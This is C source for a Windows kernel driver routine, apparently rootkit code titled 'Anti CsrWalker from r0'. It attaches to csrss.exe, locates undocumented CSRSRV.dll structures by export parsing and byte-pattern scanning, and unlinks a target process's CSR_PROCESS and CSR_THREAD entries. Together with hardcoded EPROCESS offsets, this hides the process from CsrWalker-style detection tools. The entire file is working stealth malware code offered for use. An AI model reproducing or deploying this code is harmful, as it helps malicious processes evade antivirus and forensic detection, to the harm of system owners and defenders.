/*
Anti CsrWalker from r0 by Orkblutt
( http://orkblutt.free.fr )

Original idea and implementation by 0vercl0ck
http://overclok.free.fr/Codes/PspCidTable/UnlinkInCrss%20-%20Ring0.html
http://0vercl0k.blogspot.com/

modified to unlink CSR_THREAD and to work under Vista
*/

int UnlinkIt(ULONG Pid, PEPROCESS pCsrss)
{
   PEPROCESS                pCurrentEprocess;
    PLIST_ENTRY              pleCurrent;
    LIST_ENTRY               lEntry;
    ULONG                    ulStartingValue;
    KAPC_STATE               kApcState;
    PUCHAR                   pPeb , pPebLdr , pPebLdrEntry , imgBaseCsrsrv , name , CsrLockProcessByClientId = 0 , CsrRootProcess , CsrLockThreadByClientId, CsrThreadHashTable ;
    PIMAGE_DOS_HEADER        pImgDosHeader;
    PIMAGE_NT_HEADERS        pImgNtHeader;
    PIMAGE_EXPORT_DIRECTORY  pImgExportDirectory;
    PULONG                   rvaNameTable , rvaAdressTable;
    int                     i;
    PCSR_PROCESS            pCsrProcess;
    PCSR_THREAD                pCsrHashThread;

    imgBaseCsrsrv            = NULL;
    CsrLockProcessByClientId = NULL;
    CsrLockThreadByClientId = NULL;
    CsrThreadHashTable = NULL;
    
   

 
    KeStackAttachProcess( (PKPROCESS)pCsrss , &kApcState );


    pPeb    = (PUCHAR)*(PULONG)((PUCHAR)pCsrss + 0x1b0);                //   +0x1b0 Peb              : Ptr32 _PEB
    pPebLdr = (PUCHAR)*(PULONG)(pPeb + 0x00c);                         //   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA

    pleCurrent        = (PLIST_ENTRY)(pPebLdr+0x00c);                  //+0x00c InLoadOrderModuleList : _LIST_ENTRY
    pPebLdrEntry      = (PUCHAR)pleCurrent->Flink;
    ulStartingValue   = (ULONG)pPebLdrEntry;
    pleCurrent        = (PLIST_ENTRY)pleCurrent->Flink;


   
    while (ulStartingValue != (ULONG)pleCurrent->Flink)
    {
        // DbgPrint("Modul : %ws.\n" , *(PULONG)(pPebLdrEntry+0x024+0x004) );   //+0x024 FullDllName      : _UNICODE_STRING //   +0x004 Buffer           : Ptr32 Uint2B
        if ( wcsstr( (wchar_t*)*(PULONG)(pPebLdrEntry+0x024+0x004) , L"CSRSRV.dll" ) != NULL )
        {
            imgBaseCsrsrv = (PUCHAR)*(PULONG)(pPebLdrEntry + 0x018) ;                   //   +0x018 DllBase          : Ptr32 Void
            break;
        }
        pPebLdrEntry = (PUCHAR)pleCurrent->Flink;
        pleCurrent   = (PLIST_ENTRY)pleCurrent->Flink;
    }
    if (imgBaseCsrsrv == NULL)
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }

    //DbgPrint("Image Base Csrsrv.dll : %x." , imgBaseCsrsrv );

    /*                      */
    /* Parcours de son EAT  */

    pImgDosHeader       = (PIMAGE_DOS_HEADER)imgBaseCsrsrv;
    pImgNtHeader        = (PIMAGE_NT_HEADERS)(imgBaseCsrsrv + pImgDosHeader->e_lfanew);
    pImgExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(imgBaseCsrsrv + pImgNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    rvaNameTable   = (PULONG)(imgBaseCsrsrv + pImgExportDirectory->AddressOfNames);
    rvaAdressTable = (PULONG)(imgBaseCsrsrv + pImgExportDirectory->AddressOfFunctions);

    for ( i = 0 ; i < (int)pImgExportDirectory->NumberOfFunctions ; i++)
    {
        //DbgPrint("Function : %s.\n" , imgBaseCsrsrv + rvaNameTable );
        if ( strcmp("CsrLockProcessByClientId" , (const char *)imgBaseCsrsrv + rvaNameTable) == 0 )
        {
            CsrLockProcessByClientId = imgBaseCsrsrv + rvaAdressTable;
            // DbgPrint("CsrLockProcessByClientId : %x.\n" , CsrLockProcessByClientId );
            break;
        }
    }
    if ( CsrLockProcessByClientId == NULL )
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }

  
    for ( i = 0 ; i < 50 ; i++ )
    {
        if ( (*(CsrLockProcessByClientId+i) == 0x83) && (*(CsrLockProcessByClientId+i+1) == 0x22) && (*(CsrLockProcessByClientId+i+2) == 0x00) && (*(CsrLockProcessByClientId+i+3) == 0x8B) && (*(CsrLockProcessByClientId+i+4) == 0x35) &&
                (*(CsrLockProcessByClientId+i+9) == 0x83) && (*(CsrLockProcessByClientId+i+10) == 0xC6) && (*(CsrLockProcessByClientId+i+11) == 0x08) )
        {
            CsrRootProcess = (PUCHAR)*(PULONG)(*(PULONG)(CsrLockProcessByClientId+i+5));
            break;
        }
    }
    if ( i == 50 )
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }


    pCsrProcess = (PCSR_PROCESS)CsrRootProcess;

  
    pCurrentEprocess        = IoGetCurrentProcess();
    ulStartingValue         = (ULONG)pCurrentEprocess;

    do
    {
        if (Pid == *(PULONG)((PUCHAR)pCurrentEprocess + 0x084))
            break;

        pleCurrent = (PLIST_ENTRY)((PUCHAR)pCurrentEprocess + 0x88);    //   +0x088 ActiveProcessLinks : _LIST_ENTRY
        pCurrentEprocess = (PEPROCESS)((PUCHAR)pleCurrent->Flink - 0x88);

    }
    while ((ULONG)pCurrentEprocess != ulStartingValue);

    if ((ULONG)pCurrentEprocess == ulStartingValue)
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }



    i = 0;  

    lEntry  = pCsrProcess->ListLink;
    ulStartingValue = (ULONG)pCsrProcess;
    pCsrProcess = (PCSR_PROCESS)((PUCHAR)lEntry.Flink - 0x8);


    while (ulStartingValue != (ULONG)pCsrProcess)
    {
        if ( (ULONG)pCsrProcess->ClientId.UniqueProcess == *(PULONG)((PUCHAR)pCurrentEprocess + 0x084) ) //   +0x084 UniqueProcessId  : Ptr32 Void
        {
            *(PULONG)(pCsrProcess->ListLink.Blink)             = (ULONG) pCsrProcess->ListLink.Flink;
            *(PULONG)((PUCHAR)pCsrProcess->ListLink.Flink + 4) = (ULONG)pCsrProcess->ListLink.Blink;
            i = 1;
        }

        lEntry = *(lEntry.Flink);
        pCsrProcess = (PCSR_PROCESS)((PUCHAR)lEntry.Flink - 0x8);
    }
    if ( i == 0 )
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }

    for ( i = 0 ; i < (int)pImgExportDirectory->NumberOfFunctions ; i++)
    {
        if ( strcmp("CsrLockThreadByClientId" , (const char *)imgBaseCsrsrv + rvaNameTable) == 0 )
        {
            CsrLockThreadByClientId = imgBaseCsrsrv + rvaAdressTable;
            break;
        }
    }

    if ( CsrLockThreadByClientId == NULL )
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }


    for ( i = 0 ; i < 50 ; i++ )
    {
        if ( (*(CsrLockThreadByClientId+i) == 0x8D) && (*(CsrLockThreadByClientId+i+2) == 0xC5))
        {
            CsrThreadHashTable = (PUCHAR)(*(PULONG)(CsrLockThreadByClientId+i+3));
            break;
        }
    }
    if(CsrThreadHashTable == 0)
    {
          KeUnstackDetachProcess( &kApcState );
          return 0;
    }

    for (i = 0; i < 256; i++)
    {
        PLIST_ENTRY ListHead, NextEntry;

        ListHead = (PLIST_ENTRY)(CsrThreadHashTable + (8 * i));

        NextEntry = ListHead->Flink;

        while (NextEntry != ListHead)
        {
            pCsrHashThread = CONTAINING_RECORD(NextEntry, CSR_THREAD, HashLinks);
            if (pCsrHashThread)
            {
                if ((ULONG)pCsrHashThread->Process->ClientId.UniqueProcess == Pid)
                {
                    *(PULONG)(NextEntry->Blink)             = (ULONG) NextEntry->Flink;
                    *(PULONG)((PUCHAR)NextEntry->Flink + 4) = (ULONG)NextEntry->Blink;
                }
            }
            NextEntry = NextEntry->Flink;
        }
    }

    KeUnstackDetachProcess( &kApcState );
    return 1;
}


void UnlinkFromCsrss(ULONG PidToHide)
{

    PEPROCESS                pCurrentEprocess;
    PLIST_ENTRY              pleCurrent;
    ULONG                    ulStartingValue;

    pCurrentEprocess        = IoGetCurrentProcess();
    ulStartingValue         = (ULONG)pCurrentEprocess;

    do
    {
        if (strncmp("csrss.exe" , (const char *)pCurrentEprocess + 0x174 , 15) == 0)
        {
            if(UnlinkIt(PidToHide, pCurrentEprocess))
                DbgPrint("%d unlinked from csrss:%d\n", PidToHide, *(PULONG)((PUCHAR)pCurrentEprocess + 0x084));
            else
                DbgPrint("can't unlink %d from csrss:%d\n", PidToHide, *(PULONG)((PUCHAR)pCurrentEprocess + 0x084));

        }
        pleCurrent = (PLIST_ENTRY)((PUCHAR)pCurrentEprocess + 0x88);
        pCurrentEprocess = (PEPROCESS)((PUCHAR)pleCurrent->Flink - 0x88);

    }
    while ((ULONG)pCurrentEprocess != ulStartingValue);
}